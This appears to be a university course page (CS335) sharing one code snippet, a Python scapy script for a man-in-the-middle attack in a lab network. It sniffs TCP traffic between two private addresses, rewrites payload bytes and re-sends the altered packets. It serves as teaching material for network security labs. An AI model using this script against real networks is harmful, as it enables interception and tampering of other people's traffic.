---
layout: default
course_number: CS335
title: Code Snippets
---

Man in the middle

```
#!/usr/bin/env python3
from scapy.all import *

client = "10.9.0.5"
server = "10.9.0.6"

def spoof_pkt(pkt):
	if pkt[IP].src == client and pkt[IP].dst == server:

		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)

		if pkt[TCP].payload:
			data = pkt[TCP].payload.load
			newdata = data.replace(b'cs335', b'cs101')
			#print(newdata)
			send(newpkt/newdata, verbose=0)
		else:
			send(newpkt, verbose=0)
	elif pkt[IP].src == server and pkt[IP].dst == client:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].chksum)
		send(newpkt, verbose=0)

pkt = sniff(iface='eth0', filter='tcp', prn=spoof_pkt)
```
